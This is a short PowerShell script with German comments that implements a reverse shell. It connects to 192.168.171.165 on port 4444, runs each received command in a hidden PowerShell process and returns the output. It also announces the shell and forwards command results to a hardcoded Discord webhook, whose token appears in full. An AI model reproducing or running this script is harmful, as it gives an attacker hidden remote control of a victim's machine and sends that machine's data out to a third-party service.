# Setze die Discord-Webhook-URL
$webhookUrl = 'https://discord.com/api/webhooks/1195732732693717112/KkX_ctFkiqFGDQwCR_UhhwDh5kAD-27vdiDdEw8sYPhFvKNoGsq39Wxk8MQhvC9GxaGv'

# Funktion zum Senden einer Nachricht an den Discord-Channel
function Send-DiscordMessage {
    param (
        [string]$Message
    )

    $jsonPayload = @{
        content = $Message
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'
}

# Testnachricht senden
Send-DiscordMessage -Message 'Reverse Shell gestartet!'

$ip = '192.168.171.165'
$port = 4444
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($ip, $port)

$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter $stream
$reader = New-Object System.IO.StreamReader $stream

while ($true) {
    $command = $reader.ReadLine()
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo.FileName = 'powershell.exe'
    $process.StartInfo.Arguments = '-NoProfile -NonInteractive -Command -'
    $process.StartInfo.RedirectStandardInput = $true
    $process.StartInfo.RedirectStandardOutput = $true
    $process.StartInfo.UseShellExecute = $false
    $process.StartInfo.CreateNoWindow = $true
    $process.Start()
    $inputStream = $process.StandardInput
    $outputStream = $process.StandardOutput
    $inputStream.WriteLine($command)
    $inputStream.Close()
    $output = $outputStream.ReadToEnd()
    $outputBytes = [System.Text.Encoding]::UTF8.GetBytes($output)
    $stream.Write($outputBytes, 0, $outputBytes.Length)
    $stream.Flush()
    $process.WaitForExit()
}


# Beispiel: Senden von Ergebnissen an Discord
while ($true) {
    $command = $reader.ReadLine()
    $output = Invoke-Expression -Command $command
    Send-DiscordMessage -Message $output
}
